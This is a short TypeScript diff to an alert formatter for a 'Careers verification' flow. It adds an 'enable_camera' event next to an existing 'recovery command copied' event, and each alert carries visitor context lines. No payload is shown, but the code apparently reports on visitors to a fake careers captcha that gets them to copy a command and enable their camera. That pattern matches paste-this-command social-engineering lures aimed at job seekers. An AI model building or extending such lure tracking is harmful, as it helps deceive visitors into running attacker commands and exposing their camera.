@@ -271,13 +271,15 @@ export function formatChatAlert(data: ChatTurnAlert): string {
 }
 
 export function formatCaptchaAlert(data: {
-  event: "started" | "copy_command";
+  event: "started" | "copy_command" | "enable_camera";
   context: VisitorContextLines;
 }): string {
   const title =
     data.event === "started"
       ? "🔐 Careers verification started"
-      : "✅ Careers recovery command copied";
+      : data.event === "enable_camera"
+        ? "📷 Careers identity camera enable"
+        : "✅ Careers recovery command copied";
 
   return [`<b>${title}</b>`, formatVisitorContextBlock(data.context)].join("\n");
 }
